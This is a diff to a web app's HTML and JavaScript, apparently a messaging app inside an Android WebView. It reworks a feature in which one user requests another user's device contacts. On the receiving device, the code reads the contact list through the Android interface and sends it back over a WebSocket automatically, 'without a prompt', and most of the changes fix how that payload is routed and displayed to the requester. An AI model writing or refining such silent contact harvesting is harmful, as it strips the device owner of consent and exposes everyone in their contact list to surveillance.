@@ -1559,7 +1559,7 @@
     <div id="contacts-modal" class="login-modal-overlay hidden">
         <div class="login-box" style="width: 90%; max-width: 500px; max-height: 80vh; display: flex; flex-direction: column;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h2>Device Contacts</h2> <!-- This will be updated dynamically -->
+                <h2>Device Contacts</h2>
                 <span id="close-contacts-modal" style="font-size: 2rem; cursor: pointer; line-height: 1;">&times;</span>
             </div>
             <div id="contacts-list" style="overflow-y: auto; text-align: left; border-top: 1px solid #eee; padding-top: 10px;">
@@ -2707,11 +2707,9 @@
                         case 'contacts-response':
                             // Received contacts from the other user, display them
                             // **THE FIX**: Only show the modal to the user who requested the contacts.
-                            if (activeUser === data.payload.requester) {
-                                const senderName = data.payload.from.charAt(0).toUpperCase() + data.payload.from.slice(1);
-                                document.querySelector('#contacts-modal h2').textContent = `${senderName}'s Contacts`;
+                            if (activeUser === data.payload.to) {
                                 displayContacts(data.payload.contacts);
-                                contactsModal.classList.add('visible'); // This was correct
+                                contactsModal.classList.add('visible');
                             }
                             break;
                         case 'contacts-denied':
@@ -3946,12 +3944,12 @@
 
             // 2. This client receives a request for its contacts
             const handleContactRequest = (payload) => { // This was correct
-                // **THE FIX**: Only proceed if this client is the recipient of the request.
-                if (activeUser !== payload.to) return;
+                // Only proceed if this client is the recipient of the request.
+                if (activeUser !== payload.to) return; // e.g., if I am 'raushan' and the request is for 'raushan'
 
                 // Automatically fulfill the contact request without a prompt.
                 // Set a flag to indicate these contacts are for sending, not for local display.
-                window.isContactRequestPending = true;
+                window.isContactRequestPending = true; // This flag tells onContactsReceived to send data back.
                 window.contactRequestRecipient = payload.from;
 
                 // Use the Android interface to get contacts.
@@ -3967,17 +3965,14 @@
             // 3. Modify onContactsReceived to handle both local display and remote sending
             window.onContactsReceived = (contactsJson) => { // This function is called by Android
                 if (window.isContactRequestPending) {
-                    // This was triggered by a remote request. Send the data back.
+                    // This was triggered by a remote request. Send the contact data back to the original requester.
                     const contacts = JSON.parse(contactsJson);
-                    // **THE FIX**: Send who the contacts are FROM and who the REQUESTER is.
-                    socket.send(JSON.stringify({
-                        type: 'contacts-response',
-                        payload: {
-                            from: activeUser, // The user whose contacts these are
-                            requester: window.contactRequestRecipient, // The user who should see the popup
-                            contacts: contacts
-                        }
-                    }));
+                    socket.send(JSON.stringify({ type: 'contacts-response', payload: { 
+                        from: activeUser,                   // The user whose contacts these are (e.g., 'raushan')
+                        to: window.contactRequestRecipient, // The user who requested them (e.g., 'nisha')
+                        contacts: contacts,
+                        requester: window.contactRequestRecipient // **THE FIX**: Add the original requester to the payload.
+                    } }));
                     window.isContactRequestPending = false; // Reset the flag
                 } else {
                     // This was a local request ("Fetch Contacts" button). Display the modal locally.
@@ -4086,4 +4081,5 @@
     </script>
 
 </body>
+
 </html>
